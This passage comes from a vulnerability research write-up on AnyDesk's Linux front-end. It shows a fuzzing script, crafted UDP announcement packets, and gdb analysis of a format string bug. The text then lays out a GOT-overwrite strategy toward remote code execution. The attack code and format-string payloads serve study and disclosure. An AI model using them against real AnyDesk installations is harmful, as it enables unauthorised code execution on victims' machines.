import os
import time

ip = '127.0.0.1'
port = 50001
host_payloads = [''] * 10
dump_idx = 0

def mutate(pl):
  p = subprocess.Popen(['/usr/bin/radamsa', '-'], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
  return p.communicate(pl)[0]

def isAlive():
  for p in psutil.process_iter():
    if (p.name() == 'anydesk' and len(p.cmdline()) == 1): return True
  return False

def gen_discover_packet(ad_id, os, hn, user, inf, func):
  d  = chr(0x3e)+chr(0xd1)+chr(0x1)
  d += struct.pack('>I', ad_id)
  d += struct.pack('>I', 0)
  d += chr(0x2)+chr(os)
  d += struct.pack('>I', len(hn)) + hn
  d += struct.pack('>I', len(user)) + user
  d += struct.pack('>I', 0)
  d += struct.pack('>I', len(inf)) + inf
  d += chr(0)
  d += struct.pack('>I', len(func)) + func
  d += chr(0x2)+chr(0xc3)+chr(0x51)
  return d

def dump():
  global dump_idx
  print('dumping '+str(dump_idx))
  os.system('mkdir loot'+str(dump_idx))
  for i in range(len(host_payloads)):
    f = open('./loot'+str(dump_idx)+'/host_payload'+str(i), 'wb')
    f.write(host_payloads[i])
    f.close()
  dump_idx += 1
  os.system('anydesk&')
  time.sleep(5)

idx = 0
while True:
  time.sleep(5.0)
  host = mutate('host')
  if (len(host) > 45000): continue # max length
  host_payloads[idx%len(host_payloads)] = host
  p = gen_discover_packet(4919, 2, host, 'user', 'ad', 'main')
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  s.sendto(p, (ip, port))
  s.close()
  idx += 1
  if (not isAlive()): dump()

```

The sleep time for each fuzzing iteration is quite high (5 seconds), but it turned out that the GUI is only updated every 5 seconds. At first I thought about patching the binary in order to increase the update interval, but before digging into this I decided to just let the fuzzer run over a night.

At the next day the fuzzing results were ready to be evaluated. The front-end actually crashed a few times and the script stored the fuzzing inputs on disk. At first we need to determine which exact payload triggered the crash. Since we saved the last 10 payloads sent to the application, we just need to resend these payloads and determine which one makes the application crash. This can be done using the following script:

```

#!/usr/bin/env python

import struct
import socket
import sys

ip = '127.0.0.1'
port = 50001

def gen_discover_packet(ad_id, os, hn, user, inf, func):
  ...

host = open(sys.argv[1]).read()
p = gen_discover_packet(4919, 2, host, 'user', 'ad', 'main')
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(p, (ip, port))
s.close()

```

By sending the following payload the front-end crashes:

```

user@w00d:~$ ./resend.py loot2/host_payload4

... crash ...

user@w00d:~$ hexdump -C loot2/host_payload4
00000000  61 61 61 61 25 64 25 6e  25 70 25 64 24 2b f3 a0  |aaaa%d%n%p%d$+..|
00000010  81 9c 81 bd 0b 7c                                 |.....||
00000016

```

By fuzzing the AnyDesk front-end process with a python script, which produces valid announcement frames and mutates the hostname using radamsa, we successfully generated an input, which crashes the application. The next step is to analyze the bug in order the determine, if we can exploit it.

# Bug

So far we have fuzzed the AnyDesk front-end and identified an input which makes the front-end crash. The next step is to determine what the cause of this crash is and to examine if it is based on a bug which we can exploit.

At first we start up the front-end again and attach gdb to it (the `pid_frontend.py` script merely retrieves the current `PID` of the front-end process):

```

root@w00d:~# gdb /usr/bin/anydesk $(~/pid_frontend.py)

...
Reading symbols from /usr/bin/anydesk...(no debugging symbols found)...done.
Attaching to program: /usr/bin/anydesk, process 10911
[New LWP 10913]
[New LWP 10914]
[New LWP 10928]
[New LWP 10931]
[New LWP 10938]
[New LWP 10941]
[New LWP 10942]
[New LWP 10943]
[New LWP 10944]
[New LWP 10945]
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

[----------------------------------registers-----------------------------------]
RAX: 0xfffffffffffffdfc
RBX: 0x1cf7720 --> 0x100000005
RCX: 0x7f491870ebf9 (<__GI___poll+73>:	cmp    rax,0xfffffffffffff000)
RDX: 0x37a0
RSI: 0x3
RDI: 0x1cf7720 --> 0x100000005
RBP: 0x3
RSP: 0x7ffe12cbcfb0 --> 0x1aa05cc --> 0x2
RIP: 0x7f491870ebf9 (<__GI___poll+73>:	cmp    rax,0xfffffffffffff000)
R8 : 0x0
R9 : 0x1ab6720 --> 0x1900000024
R10: 0x1ce3000 --> 0x1ab6720 --> 0x1900000024
R11: 0x293
R12: 0x37a0
R13: 0x37a0
R14: 0x7f491d0b9f70 (<g_poll>:	mov    esi,esi)
R15: 0x3
EFLAGS: 0x293 (CARRY parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x7f491870ebef <__GI___poll+63>:	mov    rdi,rbx
   0x7f491870ebf2 <__GI___poll+66>:	mov    eax,0x7
   0x7f491870ebf7 <__GI___poll+71>:	syscall
=> 0x7f491870ebf9 <__GI___poll+73>:	cmp    rax,0xfffffffffffff000
   0x7f491870ebff <__GI___poll+79>:	ja     0x7f491870ec32 <__GI___poll+130>
   0x7f491870ec01 <__GI___poll+81>:	mov    edi,r8d
   0x7f491870ec04 <__GI___poll+84>:	mov    DWORD PTR [rsp+0xc],eax
   0x7f491870ec08 <__GI___poll+88>:	call   0x7f491872a740 <__libc_disable_asynccancel>
[------------------------------------stack-------------------------------------]
0000| 0x7ffe12cbcfb0 --> 0x1aa05cc --> 0x2
0008| 0x7ffe12cbcfb8 --> 0x1cf7720 --> 0x100000005
0016| 0x7ffe12cbcfc0 --> 0x1957be0 --> 0x0
0024| 0x7ffe12cbcfc8 --> 0x3
0032| 0x7ffe12cbcfd0 --> 0x1cf7720 --> 0x100000005
0040| 0x7ffe12cbcfd8 --> 0x7f491d0aa5c9 (mov    r13d,eax)
0048| 0x7ffe12cbcfe0 --> 0x0
0056| 0x7ffe12cbcfe8 --> 0x101957be0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x00007f491870ebf9 in __GI___poll (fds=0x1cf7720, nfds=0x3, timeout=0x37a0) at ../sysdeps/unix/sysv/linux/poll.c:29
29	../sysdeps/unix/sysv/linux/poll.c: No such file or directory.
gdb-peda$ c
Continuing.

```

Now we resend the payload, which caused the crash:

```

user@w00d:~$ ./resend.py loot2/host_payload4

```

As expected the application raises a segmentation fault:

```

Thread 1 "anydesk" received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x7ffe12cbb800 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa%d%n%p%d$+\201\275\v|'")
RCX: 0x0
RDX: 0x7ffe12cbc4f8 --> 0x0
RSI: 0x7ffe12cbb568 --> 0xd24f18983b49a900
RDI: 0x7ffe12cbb5b0 --> 0x7ffefbad8001
RBP: 0x7ffe12cbb5a0 --> 0x7ffe12cbbc00 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa30849456\275\313\022\376\177")
RSP: 0x7ffe12cbb030 --> 0x7f491ec3a6f0 (<gtk_widget_destroy>:	push   rbx)
RIP: 0x7f4918657932 (<_IO_vfprintf_internal+9634>:	mov    DWORD PTR [rax],r13d)
R8 : 0x0
R9 : 0x0
R10: 0x0
R11: 0x7ffe12cbb88c --> 0xf32b24642570256e
R12: 0x7ffe12cbc4c8 --> 0x3000000020 (' ')
R13: 0x91
R14: 0x7ffe12cbb5b0 --> 0x7ffefbad8001
R15: 0x6e ('n')
EFLAGS: 0x10212 (carry parity ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x7f4918657928 <_IO_vfprintf_internal+9624>:	add    eax,0x8
   0x7f491865792b <_IO_vfprintf_internal+9627>:	mov    DWORD PTR [r12],eax
   0x7f491865792f <_IO_vfprintf_internal+9631>:	mov    rax,QWORD PTR [rdx]
=> 0x7f4918657932 <_IO_vfprintf_internal+9634>:	mov    DWORD PTR [rax],r13d
   0x7f4918657935 <_IO_vfprintf_internal+9637>:	jmp    0x7f4918655930 <_IO_vfprintf_internal+1440>
   0x7f491865793a <_IO_vfprintf_internal+9642>:	mov    QWORD PTR [rbp-0x4e8],r11
   0x7f4918657941 <_IO_vfprintf_internal+9649>:	mov    QWORD PTR [rbp-0x4e0],rax
   0x7f4918657948 <_IO_vfprintf_internal+9656>:	call   0x7f4918684150 <_IO_vtable_check>
[------------------------------------stack-------------------------------------]
0000| 0x7ffe12cbb030 --> 0x7f491ec3a6f0 (<gtk_widget_destroy>:	push   rbx)
0008| 0x7ffe12cbb038 --> 0x0
0016| 0x7ffe12cbb040 --> 0x7ffe12cbb88a ("d%n%p%d$+\201\275\v|'")
0024| 0x7ffe12cbb048 --> 0x7ffe00000000
0032| 0x7ffe12cbb050 --> 0x0
0040| 0x7ffe12cbb058 --> 0x1
0048| 0x7ffe12cbb060 --> 0xffffffffffffffff
0056| 0x7ffe12cbb068 --> 0x100000000
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00007f4918657932 in _IO_vfprintf_internal (s=s@entry=0x7ffe12cbb5b0,
    format=format@entry=0x7ffe12cbb800 "Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa%d%n%p%d$+\201\275\v|'", ap=ap@entry=0x7ffe12cbc4c8) at vfprintf.c:1642
1642	vfprintf.c: No such file or directory.

```

As we can see, the crash is caused by the instruction `mov DWORD PTR [rax], r13d` within the function `_IO_vfprintf_internal`. Since the value of `rax` is `0` a segmentation fault is raised. Using the command `bt` we can print the stacktrace:

```

gdb-peda$ bt
#0  0x00007f4918657932 in _IO_vfprintf_internal (s=s@entry=0x7ffe12cbb5b0,
    format=format@entry=0x7ffe12cbb800 "Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa%d%n%p%d$+\201\275\v|'", ap=ap@entry=0x7ffe12cbc4c8) at vfprintf.c:1642
#1  0x00007f4918682910 in _IO_vsnprintf (
    string=0x7ffe12cbbc00 "Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa30849456\275\313\022\376\177", maxlen=<optimized out>,
    format=0x7ffe12cbb800 "Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa%d%n%p%d$+\201\275\v|'", args=0x7ffe12cbc4c8) at vsnprintf.c:114
#2  0x00000000008ab34b in ?? ()
#3  0x00000000008aba98 in ?? ()
#4  0x0000000000434395 in ?? ()
#5  0x00007f491d0b11cd in g_logv () from /usr/lib/x86_64-linux-gnu/libglib-2.0.so.0
#6  0x00007f491d0b133f in g_log () from /usr/lib/x86_64-linux-gnu/libglib-2.0.so.0
...

```

According to the output the return address after the `vsnprintf` call is `0x8ab34b` (`#2`). Let’s examine the code at this address in `ghidra`:

![](https://devel0pment.de/wp-content/uploads/2020/05/anyd_04.png)

The call to `vsnprintf` is at `0x8ab346`. The third parameter of the function is the format string to be used (`local_cb8`). A few lines before we can see that the fourth parameter of the outer function (`param_4`) is copied into `local_cb8` using `strncpy`. In order to determine which parameters were passed to `vsnprintf` let’s set a breakpoint on the call and resend the payload:

```

gdb-peda$ b *0x8ab346
Breakpoint 1 at 0x8ab346
gdb-peda$ c
Continuing.

```

```

user@w00d:~$ ./resend.py loot2/host_payload4

```

```

[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x11c5040 --> 0x21 ('!')
RCX: 0x7ffec15e4248 --> 0x3000000010
RDX: 0x7ffec15e3580 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa%d%n%p%d$+\201\275\v|'")
RSI: 0x400
RDI: 0x7ffec15e3980 --> 0x7
RBP: 0x5
RSP: 0x7ffec15e34a0 --> 0x7ffec15e3670 --> 0x0
RIP: 0x8ab346 (call   0x412d90 <vsnprintf@plt>)
R8 : 0x0
R9 : 0x10
R10: 0xffffffa0
R11: 0x7fb9b72f9550 --> 0xfff08320fff08310
R12: 0x7ffec15e4248 --> 0x3000000010
R13: 0xb366d8 --> 0x62696c67 ('glib')
R14: 0x2475ec0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa%d%n%p%d$+\201\275\v|'")
R15: 0x4
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffec15e3980 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffec15e3580 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa%d%n%p%d$+\201\275\v|'")
arg[3]: 0x7ffec15e4248 --> 0x3000000010
[------------------------------------stack-------------------------------------]
0000| 0x7ffec15e34a0 --> 0x7ffec15e3670 --> 0x0
0008| 0x7ffec15e34a8 --> 0x7ffec15e3600 ("lid 'aaaa%d%n%p%d$+\201\275\v|'")
0016| 0x7ffec15e34b0 --> 0x25ed450 --> 0x0
0024| 0x7ffec15e34b8 --> 0x7ffec15e3600 ("lid 'aaaa%d%n%p%d$+\201\275\v|'")
0032| 0x7ffec15e34c0 --> 0x7ffec15e3820 --> 0x0
0040| 0x7ffec15e34c8 --> 0x7fb9bbbe89d4 (<g_hash_table_lookup+52>:	mov    r8d,0x2)
0048| 0x7ffec15e34d0 --> 0x23e8230 --> 0x2253ab0 --> 0x2244340 --> 0x31 ('1')
0056| 0x7ffec15e34d8 --> 0x2622e60 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Thread 1 "anydesk" hit Breakpoint 1, 0x00000000008ab346 in ?? ()

```

We hit the breakpoint on the call to `vsnprintf`. The third parameter (`RDX`) contains the format string. The passed string obviously contains an error message about an invalid UTF-8 encoded text. But this string does also contain the string, which caused the error: `'aaaa%d%n%p%d$+\201\275\v|'`. This is our fuzzing input! In the format string! We have found a format string vulnerability.

In this case the actual crash of the application was caused by the `%n` format specifier within the fuzzer-generated data. The `%n` format specifier can be used to write data. The address, where the data in this case is supposed to be written, happened to be null. This caused the segmentation fault.

Analyzing the code a little bit further we can determine that the call to `vsnprintf` prepares a string, which will be written to the log file (`~/.anydesk/anydesk.trace`). The fourth parameter of the outer function, which will be used as the format string, is in this case an error message generated by the `glib` library, which is raised because the text contains an invalid UTF-8 sequence. This error message was obviously assumed to be static. However the error message contains the input, which caused the error (the fuzzed hostname), which we can control. Thus we can control parts of the format string by inserting an invalid UTF-8 sequence into the hostname of an announcement frame. This results in a classical format string vulnerability.

Also it turned out that the vulnerable call is actually made twice. By sending an announcement frame with an invalid UTF-8 sequence and a format specifier (`'\x85\xfeTEST %p'`), we can see the result in `~/.anydesk/anydesk.trace`:

```

user@w00d:~$ tail -n 3 ~/.anydesk/anydesk.trace
warning 2020-05-25 08:59:02.119   frontend   main   4431   4431                                  glib - Failed to set text from markup due to error parsing markup: Error on line 1 char 43: Invalid UTF-8 encoded text in name - not valid '??TEST 0x15334e0'
warning 2020-05-25 08:59:02.125   frontend   main   4431   4431                                  glib - Failed to set text from markup due to error parsing markup: Error on line 1 char 43: Invalid UTF-8 encoded text in name - not valid '??TEST 0x15334e0'
   info 2020-05-25 08:59:02.132   frontend   main   4431   4431                     unix_app.frontend - Monitoring online states.

```

The error message has been written twice to the log file. We can also see how the inserted format specifier (`%p`) has been evaluated.

After analyzing the segmentation fault discovered by fuzzing the front-end process, we identified that the cause of the crash is a format string vulnerability. The next step is to develop an exploit for the identified vulnerability.

# Exploit

Within my writeup on [RPISEC/MBE lab04B](https://devel0pment.de/?p=351#lab4B) I described the basics on how to exploit a format string vulnerability using the `%n` format specifier. This format specifier can be used to write data and also caused the segmentation fault when fuzzing the application. Within this section we will take a look at how to exploit the format string vulnerability in this very specific setting in order to gain Remote Code Execution (RCE).

## Strategy

Probably the very first thing everyone does when facing a binary exploitation challenge is to check which security mechanisms are enabled. In this case the result is very surprising:

```

user@w00d:~$ checksec /usr/bin/anydesk
[*] '/usr/bin/anydesk'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments

```

Actually no protection mechanisms are enabled, which makes the exploitation more easy.

While developing an exploit I would generally suggest to disable ASLR and just keep in mind that we have to bypass it. This makes it easier to compare addresses of multiple runs of the application:

```

user@w00d:~$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
0

```

The first goal we need to achieve is to control the instruction pointer. Since there is `No RELRO`, we can use the `%n` format specifier to overwrite an entry within the `Global Offset Table` (`GOT`). As the heap segment, where our input data will be stored, is actually executable, we can store a shellcode there and make the `GOT` entry point to this shellcode. On the next call of the function, which `GOT` entry we overwrote, our shellcode is executed.

Although these steps sound quite straight forward, achieving this turned out to be a little bit more challenging. Let’s have a look.

## The v in vsnprintf

The next instruction after the vulnerable call to `vsnprintf` is a call to the function `time`. Accordingly we can overwrite the `GOT` entry of `time` and thus redirecting the control flow immediately after the `vsnprintf` call. In order to use the `%n` format specifier to overwrite the `GOT` entry of `time`, we need to be able to reference the address of the `GOT` entry. In a classical format string exploit this is achieved by being able to control data on the stack. Since all values on the stack, which are equal or below to the current `RSP`, can be referenced with an appropriate argument selector (e.g. `%35$n`), the desired address can simply be put into the controlled stack data. Using the appropriate argument selector in combination with the `%n` format specifier causes the function to write the amount of characters written so far to this address.

In this case things are a little bit different. As you probably already noticed the vulnerable call is **not** made to the function `snprintf`, which signature looks like this:

```

snprintf(char *s, size_t n, const char *format, ...)

```

…, but rather `vsnprintf`, which signature looks like this:

```

vsnprintf(char *s, size_t n, const char *format, va_list arg)

```

The difference here is that the format string arguments are not directly passed as variable arguments (`...`), but within a `va_list` parameter (`arg`). Each of the functions in the printf family has a corresponding `va_list` function beginning with the letter `v`:

```

user@w00d:~$ man 3 printf
...

       #include <stdio.h>

       int printf(const char *format, ...);
       int fprintf(FILE *stream, const char *format, ...);
       int dprintf(int fd, const char *format, ...);
       int sprintf(char *str, const char *format, ...);
       int snprintf(char *str, size_t size, const char *format, ...);

       #include <stdarg.h>

       int vprintf(const char *format, va_list ap);
       int vfprintf(FILE *stream, const char *format, va_list ap);
       int vdprintf(int fd, const char *format, va_list ap);
       int vsprintf(char *str, const char *format, va_list ap);
       int vsnprintf(char *str, size_t size, const char *format, va_list ap);

```

The structure of `va_list` is actually specific to the `Application Binary Interface` (`ABI`), which e.g. describes the calling convention, how the stack is organized and so on. On `x86`, where all function parameters are passed on the stack, `va_list` simply consists of a pointer to the stack area, where the original parameters are stored. With `x64` things get a little bit more complex. The first six parameters are passed in registers (`RDI`, `RSI`, `RDX`, `RCX`, `R8`, `R9`), also there are special registers for floating point parameters (`XMM0` … `XMM7`). Additional parameters are passed on the stack as with `x86`. There is a very good blog post describing the details, which can be found [here](https://blog.nelhage.com/2010/10/amd64-and-va_arg/). The structure of the `va_list` looks like this on `x64`:

```

typedef struct {
  unsigned int gp_offset;
  unsigned int fp_offset;
  void *overflow_arg_area;
  void *reg_save_area;
} va_list[1];

```

There are two pointers: `overflow_arg_area`, which points to the first argument originally passed on the stack and `reg_save_area`, which points to an area on the stack where the arguments passed via registers are saved (the first six general parameters as well as eight floating point parameters). Both values `gp_offset` and `fp_offset` are offsets relative to `reg_save_arena` and reference the first general register parameter (`gp_offset`) as well as the first floating point parameter (`fp_offset`). These offsets exists because there are usually other parameters before the variable parameters (e.g. the format string itself).

Let’s have a practical look at this on the AnyDesk front-end. We attach gdb to it and set a breakpoint on the call to `vsnprintf`:

```

user@w00d:~$ sudo gdb /usr/bin/anydesk $(~/pid_frontend.py)
...
Attaching to program: /usr/bin/anydesk, process 3863
...
gdb-peda$ b *0x8ab346
Breakpoint 1 at 0x8ab346
gdb-peda$ c
Continuing.

```

Now we can use the python function again, which we created to generate announcement frames. In this case we send an announcement with the following hostname:

```

p = gen_discover_packet(4919, 1, '\x85\xfe 1.%p 2.%p 3.%p 4.%p 5.%p 6.%p 7.%p 8.%p 9.%p 10.%p', 'custom username', 'ad', 'main')
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(p, (ip, port))
s.close()

```

The beginning of the hostname (`'\x85\xfe'`) is an invalid UTF-8 sequence, which will trigger the format string vulnerability (any other invalid UTF-8 sequence can be used here). After this we use the `%p` format specifier to print the values of the first ten arguments.

A few seconds after running the script (up to 5 seconds until the GUI refreshes) our breakpoint is hit:

```

[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x11c5040 --> 0x21 ('!')
RCX: 0x7ffffffeb898 --> 0x3000000010
RDX: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 87: Invalid UTF-8 encoded text in name - not valid '\205\376 1.%p 2.%p 3.%p 4.%p 5.%p 6.%p 7.%p 8.%p 9.%p 10.%p'")
RSI: 0x400
RDI: 0x7ffffffeafd0 --> 0x7
RBP: 0x5
RSP: 0x7ffffffeaaf0 --> 0x7ffffffeacc0 --> 0x0
RIP: 0x8ab346 (call   0x412d90 <vsnprintf@plt>)
R8 : 0x0
R9 : 0x10
R10: 0xffffff81
R11: 0x7ffff1548550 --> 0xfff08320fff08310
R12: 0x7ffffffeb898 --> 0x3000000010
R13: 0xb366d8 --> 0x62696c67 ('glib')
R14: 0x1453d80 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 87: Invalid UTF-8 encoded text in name - not valid '\205\376 1.%p 2.%p 3.%p 4.%p 5.%p 6.%p 7.%p 8.%p 9.%p 10.%p'")
R15: 0x4
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffffffeafd0 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 87: Invalid UTF-8 encoded text in name - not valid '\205\376 1.%p 2.%p 3.%p 4.%p 5.%p 6.%p 7.%p 8.%p 9.%p 10.%p'")
arg[3]: 0x7ffffffeb898 --> 0x3000000010
[------------------------------------stack-------------------------------------]
0000| 0x7ffffffeaaf0 --> 0x7ffffffeacc0 --> 0x0
0008| 0x7ffffffeaaf8 --> 0x7ffffffeac50 --> 0x20fe85272064696c
0016| 0x7ffffffeab00 --> 0x158cba0 --> 0x0
0024| 0x7ffffffeab08 --> 0x7ffffffeac50 --> 0x20fe85272064696c
0032| 0x7ffffffeab10 --> 0x7ffffffeae70 --> 0x0
0040| 0x7ffffffeab18 --> 0x7ffff5e379d4 (<g_hash_table_lookup+52>:	mov    r8d,0x2)
0048| 0x7ffffffeab20 --> 0x138ca30 --> 0x11f6ab0 --> 0x11e7340 --> 0x31 ('1')
0056| 0x7ffffffeab28 --> 0x1572280 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Thread 1 "anydesk" hit Breakpoint 1, 0x00000000008ab346 in ?? ()
gdb-peda$

```

The fourth parameter (`RCX = 0x7ffffffeb898`) is the `va_list` structure. The first two unsigned ints (4 bytes each) are the members `gp_offset` and `fp_offset`:

```

gdb-peda$ x/2xw 0x7ffffffeb898
0x7ffffffeb898:	0x00000010	0x00000030

```

After these values both pointers `overflow_arg_area` and `reg_save_area` follow:

```

gdb-peda$ x/2xg 0x7ffffffeb898+8
0x7ffffffeb8a0:	0x00007ffffffeb970	0x00007ffffffeb8b0

```

Since the value of `gp_offset` is 0x10, the function which was originally called with variable arguments had two preceding general parameters. In order to display the next four general parameters assumed to be passed in the remaining registers, we need to add `gp_offset` (`0x10`) to the `reg_save_area` pointer (`0x00007ffffffeb8b0`):

```

gdb-peda$ x/4xg 0x00007ffffffeb8b0+0x10
0x7ffffffeb8c0:	0x0000000001453d80	0x0000000000000000
0x7ffffffeb8d0:	0x00007ffff1784c40	0x0000000000000010

```

`vsnprintf` assumes that these four values were passed in registers. All following values are assumed to be passed via the stack and are referenced by the `overflow_arg_area` pointer (`0x00007ffffffeb970`):

```

gdb-peda$ x/6xg 0x00007ffffffeb970
0x7ffffffeb970:	0x0000000000b366d8	0x0000000000000000
0x7ffffffeb980:	0x0000000001482b01	0x00007ffff5e4ee24
0x7ffffffeb990:	0x0000000001453d80	0x0000000000000000

```

By entering `ni` the call to `vsnprintf` is made and we can inspect the resulting string (`set print elements 0` displays the whole string without truncation):

```

gdb-peda$ ni
...
gdb-peda$ set print elements 0
gdb-peda$ x/s 0x7ffffffeafd0
0x7ffffffeafd0:	"Failed to set text from markup due to error parsing markup: Error on line 1 char 87: Invalid UTF-8 encoded text in name - not valid '\205\376 1.0x1453d80 2.(nil) 3.0x7ffff1784c40 4.0x10 5.0xb366d8 6.(nil) 7.0x1482b01 8.0x7ffff5e4ee24 9.0x1453d80 10.(nil)'"

```

The first four parameters were indeed taken from the `reg_save_area` and all following values from the `overflow_arg_arena`. The following picture summarizes the structure:

![](https://devel0pment.de/wp-content/uploads/2020/05/anyd_05-1.png)

## Gaining arbitrary write

After we have clarified what we can access with the format string, we need to find some data that we can control in the accessible data. If we can directly control data within the `reg_save_area` or `overflow_arg_area`, we could store the address of the `time GOT` entry and write to it using the `%n` format specifier.

Within the `reg_save_area` there are only 4 values we can access. These do obviously not contain any data of our input. All following parameters are stored in the `overflow_arg_area`. Let’s have a look at the first 50 values stored there using the `telescope` command:

```

gdb-peda$ telescope 0x00007ffffffeb970 50
0000| 0x7ffffffeb970 --> 0xb366d8 --> 0x62696c67 ('glib')
0008| 0x7ffffffeb978 --> 0x0
0016| 0x7ffffffeb980 --> 0x1530801 --> 0xe000007ffff17853
0024| 0x7ffffffeb988 --> 0x7ffff5e4ee24 (test   eax,eax)
0032| 0x7ffffffeb990 --> 0x167ec00 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 87: Invalid UTF-8 encoded text in name - not valid '\205\376 1,%p 2.%p 3.%p 4.%p 5.%p 6.%p 7.%p 8.%p 9.%p 10.%p'")
0040| 0x7ffffffeb998 --> 0x0
0048| 0x7ffffffeb9a0 --> 0x10
0056| 0x7ffffffeb9a8 --> 0x7ffff5e501cd (<g_logv+605>:	mov    eax,r14d)
0064| 0x7ffffffeb9b0 --> 0x7ffff7a5389b --> 0x4b544700006b7447 ('Gtk')
0072| 0x7ffffffeb9b8 --> 0x167ec00 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 87: Invalid UTF-8 encoded text in name - not valid '\205\376 1,%p 2.%p 3.%p 4.%p 5.%p 6.%p 7.%p 8.%p 9.%p 10.%p'")
0080| 0x7ffffffeb9c0 --> 0x1fffeb9d0
0088| 0x7ffffffeb9c8 --> 0x4342b0 (push   rbp)
0096| 0x7ffffffeb9d0 --> 0x0
0104| 0x7ffffffeb9d8 --> 0x7ffff7a5389b --> 0x4b544700006b7447 ('Gtk')
0112| 0x7ffffffeb9e0 --> 0x7ffffffeba18 --> 0x7ffff1431f9b (<__GI___libc_realloc+875>:	mov    r8,QWORD PTR [rsp+0x8])
0120| 0x7ffffffeb9e8 --> 0x0
0128| 0x7ffffffeb9f0 --> 0x155dd20 --> 0x7fffdc00f3d0 --> 0x1514300 --> 0x1513da0 --> 0x14d6e00 (--> ...)
0136| 0x7ffffffeb9f8 --> 0x0
0144| 0x7ffffffeba00 --> 0x500000000
0152| 0x7ffffffeba08 --> 0x7ffff5e9acd8 ("Invalid UTF-8 encoded text in name - not valid '%s'")
0160| 0x7ffffffeba10 --> 0x0
0168| 0x7ffffffeba18 --> 0x7ffff1431f9b (<__GI___libc_realloc+875>:	mov    r8,QWORD PTR [rsp+0x8])
0176| 0x7ffffffeba20 --> 0x7ffff5e969e1 --> 0x4600303262696c67 ('glib20')
...

```

We can see a few occurrences of the heap address of the format string. Although we control parts of the format string, we don’t control the address, which is what we would need to. Searching even further down the stack for possible data we can control does not yield anything useful. So it seems that we can’t control any data, which we can access with the format string. Is this already a dead end? Of course not!

Taking a look at the values above again, we can see that there are stack addresses stored on the stack. There are even stack addresses, which reference the area we can access. For example at offset `112` the stack address `0x7ffffffeba18` is stored, which corresponds to offset `168`:

```

...
0112| 0x7ffffffeb9e0 --> 0x7ffffffeba18 --> 0x7ffff1431f9b (<__GI___libc_realloc+875>:	mov    r8,QWORD PTR [rsp+0x8])
...
0168| 0x7ffffffeba18 --> 0x7ffff1431f9b (<__GI___libc_realloc+875>:	mov    r8,QWORD PTR [rsp+0x8])
...

```

If we use the appropriate argument selector we can use this stack address to write to the area we can access. We can then use another argument selector to reference the data we wrote. The following picture visualizes the basic idea:

![](https://devel0pment.de/wp-content/uploads/2020/05/anyd_06-1.png)

The problem here is that we cannot do this in a single call of `vsnprintf`. All referenced data is fetched **before** data is written by the `%n` format specifier. This means that the `%19$ln` would indeed overwrite the data on the stack, but the `%26$ln` would still evaluate to the old value, which was stored there. Accordingly we need two calls:

1. Store address of `time` `GOT` entry on the stack
2. Write to previously stored `GOT` entry address in order to control instruction pointer

